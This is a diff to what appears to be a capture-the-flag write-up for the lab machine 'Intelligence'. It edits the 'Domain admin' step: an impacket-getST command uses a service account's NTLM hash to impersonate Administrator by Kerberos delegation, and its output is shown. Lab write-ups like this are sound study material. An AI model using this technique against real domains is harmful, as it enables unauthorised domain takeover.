@@ -528,15 +528,15 @@ This user is compromised
 
 # Domain admin
 ```python
-faketime -f +7h impacket-getST -dc-ip 10.129.95.154 -spn 'WWW/dc.intelligence.htb' -hashes ':3c356107d6b589fdfc215e2c3de484b5' -impersonate administrator intelligence.htb/svc_int$
+faketime -f +7h impacket-getST intelligence.htb/svc_int$ -hashes ':3c356107d6b589fdfc215e2c3de484b5' -spn 'WWW/dc.intelligence.htb' -impersonate Administrator
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [-] CCache file is not found. Skipping...
 [*] Getting TGT for user
-[*] Impersonating administrator
+[*] Impersonating Administrator
 [*] Requesting S4U2self
 [*] Requesting S4U2Proxy
-[*] Saving ticket in administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
+[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
 ```
 I now have a ticket for the administrator
 
